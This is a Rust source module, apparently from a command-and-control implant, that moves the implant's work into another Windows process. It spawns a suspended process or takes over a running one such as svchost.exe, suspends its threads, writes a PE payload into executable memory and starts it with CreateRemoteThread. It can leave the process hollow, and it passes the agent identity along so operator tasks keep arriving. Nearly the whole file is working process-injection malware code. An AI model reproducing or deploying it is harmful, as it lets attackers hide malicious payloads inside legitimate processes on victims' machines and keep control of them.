//! Process migration: the work of the implant moves into another process.
//!
//! Three shapes are supported, and they all keep the task stream alive:
//!
//! * **spawn** — the implant creates the process itself, hands it the
//!   configuration of the beacon and lets the payload run in it;
//! * **running** — the implant takes over a process that already runs (a
//!   system process), after it suspended the threads of that process;
//! * **out** — the implant moves out of its own process: the new process
//!   carries the identity, so the server keeps the queue of the agent
//!   exactly where it was.
//!
//! The task stream survives the move because the *identity* survives it.
//! The spawned process inherits the environment of the implant, so it
//! reports the same agent id and reconnects with the same key.  The server
//! knows the agent by that id, so the tasks the operator queued while the
//! move was happening are delivered to the new process.
//!
//! The payload is written into the target the way the reflective loader
//! writes it: the headers at the base of a fresh allocation, the sections
//! at their own relative addresses, and the entry point called in a thread
//! of the target.  A payload that carries its imports with it (a beacon
//! built for the framework) links against the libraries the target already
//! has.

use crate::upk::Value;

/// The plan of a migration.
#[derive(Clone, Debug, Default)]
pub struct Plan {
    /// The image that is written into the target.
    pub payload: Vec<u8>,
    /// The program the implant spawns.  An empty value means the target is
    /// a process that already runs.
    pub program: String,
    /// The arguments of the spawned program.
    pub args: Vec<String>,
    /// The process that is taken over (0: none).
    pub pid: u32,
    /// Whether the implant leaves its own process after the move.
    pub outbound: bool,
    /// Whether the main thread of the spawned process is resumed after the
    /// payload runs.  With the flag off the process stays hollow: the
    /// payload is the only thing that runs in it.
    pub resume: bool,
    /// The environment the spawned process inherits.  It carries the
    /// identity of the agent, so the new process keeps the task stream.
    pub env: Vec<(String, String)>,
}

/// What a migration did.
#[derive(Clone, Debug, Default)]
pub struct Report {
    /// The process the work moved into.
    pub pid: u32,
    /// Whether the implant created that process.
    pub spawned: bool,
    /// Whether the implant left its own process.
    pub outbound: bool,
    /// How many threads of the target were suspended and resumed.
    pub threads: u32,
    /// The identity the new process reports.
    pub agent_id: String,
    /// The lines of the report.
    pub lines: Vec<String>,
}

impl Report {
    /// The report the operator reads.
    pub fn text(&self) -> String {
        let mut out = String::new();
        for line in &self.lines {
            out.push_str(line);
            out.push('\n');
        }
        out
    }
}

/// Read the plan of a migration out of the arguments of a task.
///
/// The arguments are the same for every shape: `data` is the image that
/// moves, `pid` is a process that already runs, `spawn` is a program the
/// implant starts, `args` are the arguments of that program, `out` says the
/// implant leaves its own process, and `resume` says whether the original
/// program of a spawned process keeps running.
pub fn plan_from_args(args: &Value) -> Plan {
    let mut plan = Plan {
        payload: args.bin_or("data", b""),
        program: args.str_or("spawn", ""),
        pid: args.u64_or("pid", 0) as u32,
        outbound: args.bool_or("out", false),
        resume: args.bool_or("resume", false),
        ..Plan::default()
    };
    if let Some(Value::Arr(items)) = args.get("args") {
        for item in items {
            if let Some(text) = item.as_str() {
                plan.args.push(text.to_string());
            }
        }
    }
    plan
}

/// Move the work of the implant into another process.
pub fn migrate(plan: &Plan) -> Result<Report, String> {
    // The target first: a plan with no destination has nowhere to put an
    // image, so that is the thing to tell the operator about when neither
    // was given.
    if plan.program.is_empty() && plan.pid == 0 {
        return Err(
            "migrate: the migration needs a target (args.pid or args.spawn)".to_string(),
        );
    }
    if plan.payload.is_empty() {
        return Err("migrate: the migration needs an image to move".to_string());
    }
    migrate_inner(plan)
}

/// The migration itself: the windows loader, or the refusal everywhere else.
#[cfg(windows)]
fn migrate_inner(plan: &Plan) -> Result<Report, String> {
    windows::migrate(plan)
}

/// The migration itself: the windows loader, or the refusal everywhere else.
#[cfg(not(windows))]
fn migrate_inner(plan: &Plan) -> Result<Report, String> {
    let _ = plan;
    Err("migrate: process migration is a Windows capability".to_string())
}

#[cfg(windows)]
mod windows {
    use std::ffi::c_void;
    use std::mem::size_of;
    use std::ptr::{null, null_mut};

    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    pub const CREATE_SUSPENDED: u32 = 0x0000_0004;
    pub const CREATE_UNICODE_ENVIRONMENT: u32 = 0x0000_0400;
    pub const TH32CS_SNAPTHREAD: u32 = 0x0000_0002;
    pub const THREAD_SUSPEND_RESUME: u32 = 0x0002;
    pub const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
    /// The snapshot of the threads fails with this value, not with null.
    pub const INVALID_HANDLE_VALUE: isize = -1;
    /// The thread was not suspended.
    pub const THREAD_FAILED: u32 = 0xFFFF_FFFF;

    /// The startup information of a process.
    ///
    /// The layout is the one of STARTUPINFOW: the size comes first, the
    /// two reserved pointers follow, and the three standard handles close
    /// the structure.
    #[repr(C)]
    pub struct StartupInfoW {
        pub cb: u32,
        pub lp_reserved: *mut u16,
        pub lp_desktop: *mut u16,
        pub lp_title: *mut u16,
        pub dw_x: u32,
        pub dw_y: u32,
        pub dw_x_size: u32,
        pub dw_y_size: u32,
        pub dw_x_count_chars: u32,
        pub dw_y_count_chars: u32,
        pub dw_fill_attribute: u32,
        pub dw_flags: u32,
        pub w_show_window: u16,
        pub cb_reserved2: u16,
        pub lp_reserved2: *mut c_void,
        pub h_std_input: *mut c_void,
        pub h_std_output: *mut c_void,
        pub h_std_error: *mut c_void,
    }

    /// The handles and the identifiers of a process the system created.
    #[repr(C)]
    pub struct ProcessInformation {
        pub process: *mut c_void,
        pub thread: *mut c_void,
        pub process_id: u32,
        pub thread_id: u32,
    }

    /// One thread of the system.
    #[repr(C)]
    pub struct ThreadEntry32 {
        pub dw_size: u32,
        pub cnt_usage: u32,
        pub thread_id: u32,
        pub owner_process_id: u32,
        pub base_priority: u32,
        pub delta_priority: u32,
        pub flags: u32,
    }

    extern "system" {
        pub fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        pub fn CloseHandle(object: *mut c_void) -> i32;
        pub fn VirtualAllocEx(
            process: *mut c_void,
            address: *mut c_void,
            size: usize,
            allocation_type: u32,
            protect: u32,
        ) -> *mut c_void;
        pub fn WriteProcessMemory(
            process: *mut c_void,
            address: *mut c_void,
            buffer: *const c_void,
            size: usize,
            written: *mut usize,
        ) -> i32;
        pub fn CreateRemoteThread(
            process: *mut c_void,
            thread_attributes: *mut c_void,
            stack_size: usize,
            start: *mut c_void,
            parameter: *mut c_void,
            flags: u32,
            thread_id: *mut u32,
        ) -> *mut c_void;
        pub fn CreateProcessW(
            application_name: *const u16,
            command_line: *mut u16,
            process_attributes: *mut c_void,
            thread_attributes: *mut c_void,
            inherit_handles: i32,
            creation_flags: u32,
            environment: *mut c_void,
            current_directory: *const u16,
            startup_info: *mut StartupInfoW,
            process_information: *mut ProcessInformation,
        ) -> i32;
        pub fn ResumeThread(thread: *mut c_void) -> u32;
        pub fn SuspendThread(thread: *mut c_void) -> u32;
        pub fn OpenThread(access: u32, inherit: i32, thread_id: u32) -> *mut c_void;
        pub fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> *mut c_void;
        pub fn Thread32First(snapshot: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        pub fn Thread32Next(snapshot: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        pub fn GetLastError() -> u32;
    }

    fn last_error() -> String {
        format!("windows error {}", unsafe { GetLastError() })
    }

    /// A string the windows API understands.
    fn wide(value: &str) -> Vec<u16> {
        let mut out: Vec<u16> = value.encode_utf16().collect();
        out.push(0);
        out
    }

    /// The command line of a spawned program.
    fn command_line(program: &str, args: &[String]) -> String {
        let mut line = String::from("\"");
        line.push_str(program);
        line.push('"');
        for arg in args {
            line.push(' ');
            line.push_str(arg);
        }
        line
    }

    /// The environment block of a spawned process.
    ///
    /// The block is a list of "KEY=VALUE" pairs, every one of them closed
    /// by a null, and the whole list closed by a second null.
    fn environment(env: &[(String, String)]) -> Vec<u16> {
        let mut out: Vec<u16> = Vec::new();
        for (key, value) in env {
            let mut pair = key.clone();
            pair.push('=');
            pair.push_str(value);
            out.extend(pair.encode_utf16());
            out.push(0);
        }
        out.push(0);
        out
    }

    /// Start a process and leave it suspended.
    fn spawn(
        program: &str,
        args: &[String],
        env: &[(String, String)],
    ) -> Result<(*mut c_void, ProcessInformation), String> {
        let mut name = wide(program);
        let mut command = wide(&command_line(program, args));
        let mut startup = StartupInfoW {
            cb: size_of::<StartupInfoW>() as u32,
            lp_reserved: null_mut(),
            lp_desktop: null_mut(),
            lp_title: null_mut(),
            dw_x: 0,
            dw_y: 0,
            dw_x_size: 0,
            dw_y_size: 0,
            dw_x_count_chars: 0,
            dw_y_count_chars: 0,
            dw_fill_attribute: 0,
            dw_flags: 0,
            w_show_window: 0,
            cb_reserved2: 0,
            lp_reserved2: null_mut(),
            h_std_input: null_mut(),
            h_std_output: null_mut(),
            h_std_error: null_mut(),
        };
        let mut info = ProcessInformation {
            process: null_mut(),
            thread: null_mut(),
            process_id: 0,
            thread_id: 0,
        };
        let mut block = environment(env);
        let environment_ptr = if env.is_empty() {
            null_mut()
        } else {
            block.as_mut_ptr() as *mut c_void
        };
        let flags = CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
        let ok = unsafe {
            CreateProcessW(
                name.as_ptr(),
                command.as_mut_ptr(),
                null_mut(),
                null_mut(),
                0,
                flags,
                environment_ptr,
                null(),
                &mut startup,
                &mut info,
            )
        };
        if ok == 0 {
            return Err(format!("migrate: the process could not be started: {}", last_error()));
        }
        Ok((info.process, info))
    }

    /// Suspend every thread of a process that already runs.
    fn suspend_threads(pid: u32) -> Result<Vec<*mut c_void>, String> {
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
        if snapshot.is_null() || snapshot as isize == INVALID_HANDLE_VALUE {
            return Err(format!("migrate: the threads could not be listed: {}", last_error()));
        }
        let mut entry = ThreadEntry32 {
            dw_size: size_of::<ThreadEntry32>() as u32,
            cnt_usage: 0,
            thread_id: 0,
            owner_process_id: 0,
            base_priority: 0,
            delta_priority: 0,
            flags: 0,
        };
        let mut handles: Vec<*mut c_void> = Vec::new();
        let mut more = unsafe { Thread32First(snapshot, &mut entry) };
        while more != 0 {
            if entry.owner_process_id == pid {
                let thread = unsafe { OpenThread(THREAD_SUSPEND_RESUME, 0, entry.thread_id) };
                if !thread.is_null() {
                    let previous = unsafe { SuspendThread(thread) };
                    if previous != THREAD_FAILED {
                        handles.push(thread);
                    } else {
                        unsafe { CloseHandle(thread) };
                    }
                }
            }
            more = unsafe { Thread32Next(snapshot, &mut entry) };
        }
        unsafe { CloseHandle(snapshot) };
        Ok(handles)
    }

    /// Write the image into the target and call its entry point.
    fn place(process: *mut c_void, payload: &[u8]) -> Result<*mut c_void, String> {
        let pe = crate::post::pe::parse(payload)?;
        let base = unsafe {
            VirtualAllocEx(
                process,
                null_mut(),
                pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if base.is_null() {
            return Err("migrate: the image could not be placed in the target".to_string());
        }
        let mut written = 0usize;
        let ok = unsafe {
            WriteProcessMemory(
                process,
                base,
                pe.headers.as_ptr() as *const c_void,
                pe.headers.len(),
                &mut written,
            )
        };
        if ok == 0 {
            return Err(format!("migrate: the headers could not be written: {}", last_error()));
        }
        for section in &pe.sections {
            if section.data.is_empty() {
                continue;
            }
            let target = (base as usize + section.rva) as *mut c_void;
            let mut written = 0usize;
            unsafe {
                WriteProcessMemory(
                    process,
                    target,
                    section.data.as_ptr() as *const c_void,
                    section.data.len(),
                    &mut written,
                )
            };
        }
        Ok((base as usize + pe.entry_rva) as *mut c_void)
    }

    /// Move the work of the implant into another process.
    pub fn migrate(plan: &super::Plan) -> Result<super::Report, String> {
        let mut report = super::Report {
            outbound: plan.outbound,
            ..super::Report::default()
        };
        let mut threads: Vec<*mut c_void> = Vec::new();
        let (process, pid, spawned) = if !plan.program.is_empty() {
            let (process, info) = spawn(&plan.program, &plan.args, &plan.env)?;
            report.pid = info.process_id;
            report.spawned = true;
            (process, info.process_id, true)
        } else {
            let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, plan.pid) };
            if process.is_null() {
                return Err(format!("migrate: the process could not be opened: {}", last_error()));
            }
            // A process that already runs is put to sleep first, so the
            // image is not written under the feet of its own threads.
            threads = suspend_threads(plan.pid)?;
            report.pid = plan.pid;
            (process, plan.pid, false)
        };
        report.threads = threads.len() as u32;

        let entry = match place(process, &plan.payload) {
            Ok(entry) => entry,
            Err(e) => {
                for thread in &threads {
                    unsafe {
                        ResumeThread(*thread);
                        CloseHandle(*thread);
                    }
                }
                unsafe { CloseHandle(process) };
                return Err(e);
            }
        };

        let thread = unsafe {
            CreateRemoteThread(
                process,
                null_mut(),
                0,
                entry,
                null_mut(),
                0,
                null_mut(),
            )
        };
        if thread.is_null() {
            for handle in &threads {
                unsafe {
                    ResumeThread(*handle);
                    CloseHandle(*handle);
                }
            }
            unsafe { CloseHandle(process) };
            return Err(format!("migrate: the payload could not be started: {}", last_error()));
        }
        unsafe { CloseHandle(thread) };

        // The threads of a process that already runs go back to work: the
        // payload runs beside them.
        for handle in &threads {
            unsafe {
                ResumeThread(*handle);
                CloseHandle(*handle);
            }
        }
        unsafe { CloseHandle(process) };

        report.lines.push(format!(
            "moved {} bytes into pid {} ({})",
            plan.payload.len(),
            pid,
            if spawned { "spawned by the implant" } else { "already running" }
        ));
        if report.threads > 0 {
            report.lines.push(format!(
                "suspended and resumed {} threads of the target",
                report.threads
            ));
        }
        if spawned && !plan.resume {
            report.lines
                .push("the process stays hollow: the payload is the only thing in it".to_string());
        }
        if !plan.env.is_empty() {
            report
                .lines
                .push("the new process inherits the identity of the agent".to_string());
        }
        Ok(report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::upk;

    fn args(pairs: Vec<(&str, Value)>) -> Value {
        upk::map(pairs)
    }

    #[test]
    fn a_migration_without_a_target_is_refused() {
        let plan = plan_from_args(&args(vec![]));
        let err = migrate(&plan).unwrap_err();
        assert!(err.contains("target"), "{err}");
    }

    #[test]
    fn a_migration_without_an_image_is_refused() {
        let plan = plan_from_args(&args(vec![("pid", upk::u(4242))]));
        let err = migrate(&plan).unwrap_err();
        assert!(err.contains("image"), "{err}");
    }

    #[test]
    fn the_plan_reads_the_arguments_of_the_task() {
        let plan = plan_from_args(&args(vec![
            ("spawn", upk::s("C:\\Windows\\System32\\svchost.exe")),
            ("args", upk::arr(vec![upk::s("-k"), upk::s("netsvcs")])),
            ("out", upk::bool_(true)),
            ("resume", upk::bool_(true)),
            ("data", upk::bin(b"image")),
        ]));
        assert_eq!(plan.program, "C:\\Windows\\System32\\svchost.exe");
        assert_eq!(plan.args, vec!["-k".to_string(), "netsvcs".to_string()]);
        assert!(plan.outbound);
        assert!(plan.resume);
        assert_eq!(plan.payload, b"image".to_vec());
    }

    #[test]
    fn the_report_reads_like_a_report() {
        let report = Report {
            pid: 4242,
            spawned: true,
            outbound: true,
            threads: 3,
            agent_id: "agent-1".to_string(),
            lines: vec!["moved 10 bytes into pid 4242".to_string()],
        };
        let text = report.text();
        assert!(text.contains("pid 4242"), "{text}");
        assert!(text.ends_with('\n'), "{text}");
    }
}
